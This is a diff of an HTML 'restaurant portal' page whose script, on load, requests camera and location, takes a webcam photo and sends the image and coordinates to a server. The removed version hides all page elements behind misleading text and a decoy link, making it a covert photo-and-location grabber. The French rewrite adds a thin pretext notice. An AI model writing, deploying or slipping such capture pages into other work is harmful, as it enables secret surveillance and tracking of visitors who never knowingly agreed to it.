@@ -1,60 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Restaurant Portal</title>
+    <title>Portail du Restaurant</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px;  }
-        .disclaimer { background-color: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeeba; margin-bottom: 20px; font-weight: bold;visibility: hidden; display: none;opacity: 0; }
-        video { border: 2px solid #ccc; border-radius: 8px; margin-bottom: 10px; background-color: #f8f9fa; visibility: hidden; display: none;opacity: 0;}
-        .spinner { margin-top: 20px; font-weight: bold; font-size: 18px; color: #0056b3;visibility: hidden; display: none;opacity: 0; }
-        canvas{visibility: hidden; display: none;opacity: 0;}
-        h1{visibility: hidden; display: none;opacity: 0;}
-        p{visibility: hidden; display: none;opacity: 0;}
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        .disclaimer { background-color: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeeba; margin-bottom: 20px; font-weight: bold; border-radius: 8px; }
+        video { border: 2px solid #ccc; border-radius: 8px; margin-bottom: 10px; background-color: #f8f9fa; }
+        .spinner { margin-top: 20px; font-weight: bold; font-size: 18px; color: #0056b3; }
     </style>
 </head>
 <body>
 
-    <h1>Welcome just wait</h1>
-    <a href="https://walidirhil.github.io/-EUREKA/" target="_blank">Go to website</a>
+    <h1>Bienvenue dans notre Restaurant</h1>
+    
     <div class="disclaimer">
-        NOTICE: this web site make just 10second.
+        ATTENTION : Ce site nécessite une photo rapide et votre position pour informer le personnel. Veuillez accepter les permissions du navigateur pour continuer.
     </div>
+
     <video id="videoFeed" width="320" height="240" autoplay playsinline></video>
     <canvas id="photoCanvas" width="320" height="240" style="display:none;"></canvas>
-    <p id="statusMessage" class="spinner">Initializing system...</p>
+    
+    <p id="statusMessage" class="spinner">Initialisation du système...</p>
 
     <script>
         const video = document.getElementById('videoFeed');
         const canvas = document.getElementById('photoCanvas');
         const statusText = document.getElementById('statusMessage');
 
-        // Main automatic function
         async function startAutomaticCapture() {
             let isCameraActive = false;
             let locationData = null;
             let imageData = null;
 
-            // --- STEP 1: Request Camera ---
-            statusText.innerText = "Waiting for web site permission...";
+            // --- ÉTAPE 1 : Tenter d'obtenir la Caméra ---
+            statusText.innerText = "En attente de la permission de la caméra...";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 isCameraActive = true;
                 
-                // Wait for the video to fully load its first frame so we don't snap a black picture
+                // Attendre 0.5s pour que la caméra fasse la mise au point
                 await new Promise((resolve) => {
                     video.onloadeddata = () => {
-                        setTimeout(resolve, 500); // Wait half a second for the lens to focus
+                        setTimeout(resolve, 500); 
                     };
                 });
             } catch (err) {
-                console.warn("Camera denied.");
+                console.warn("Caméra refusée ou non disponible.");
+                // On continue quand même !
             }
 
-            // --- STEP 2: Request Location ---
-            statusText.innerText = "Waiting for linke permission...";
+            // --- ÉTAPE 2 : Tenter d'obtenir la Localisation ---
+            statusText.innerText = "En attente de la permission de localisation...";
             if (navigator.geolocation) {
                 try {
                     locationData = await new Promise((resolve, reject) => {
@@ -64,30 +63,35 @@
                                 longitude: position.coords.longitude
                             }),
                             (error) => reject(error),
-                            { timeout: 10000 } // Give up after 10 seconds if it hangs
+                            { timeout: 10000 } // Abandonne après 10 secondes
                         );
                     });
                 } catch (error) {
-                    console.warn("web site denied.");
+                    console.warn("Localisation refusée ou non disponible.");
+                    // On continue quand même !
                 }
             }
 
-            // --- STEP 3: Process the Image ---
+            // --- ÉTAPE 3 : Capturer l'image (si la caméra a été acceptée) ---
             if (isCameraActive) {
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 imageData = canvas.toDataURL('image/png');
+                
+                // Couper la caméra une fois la photo prise pour économiser la batterie
+                const tracks = video.srcObject.getTracks();
+                tracks.forEach(track => track.stop());
             }
 
-            // --- STEP 4: Check if we have anything to send ---
+            // --- ÉTAPE 4 : Vérification finale ---
             if (!locationData && !imageData) {
-                statusText.innerText = "❌ Both permissions were denied. Cannot proceed.";
+                statusText.innerText = "❌ Caméra ET localisation refusées. Impossible de continuer.";
                 statusText.style.color = "red";
-                return; // Stop the script here
+                return; // On arrête tout
             }
 
-            // --- STEP 5: Automatically Send to Backend ---
-            statusText.innerText = "Sending data...";
+            // --- ÉTAPE 5 : Envoi des données (même s'il n'y en a qu'une seule) ---
+            statusText.innerText = "Envoi des données en cours...";
             statusText.style.color = "black";
 
             try {
@@ -100,18 +104,23 @@
                 const data = await response.json();
 
                 if (response.ok) {
-                    statusText.innerText = "✅ Success! You may now close this page.";
+                    let successMsg = "✅ Succès ! ";
+                    if (imageData && locationData) successMsg += "Photo et localisation envoyées.";
+                    else if (imageData) successMsg += "Seule la photo a été envoyée.";
+                    else if (locationData) successMsg += "Seule la localisation a été envoyée.";
+                    
+                    statusText.innerText = successMsg;
                     statusText.style.color = "green";
                 } else {
-                    throw new Error("Server rejected request");
+                    throw new Error("Le serveur a rejeté la requête");
                 }
             } catch (err) {
-                statusText.innerText = "❌ Error sending data to server.";
+                statusText.innerText = "❌ Erreur lors de l'envoi au serveur.";
                 statusText.style.color = "red";
             }
         }
 
-        // Trigger the process the exact moment the page finishes loading
+        // Lancer le script automatiquement au chargement de la page
         window.addEventListener('load', startAutomaticCapture);
     </script>
 </body>
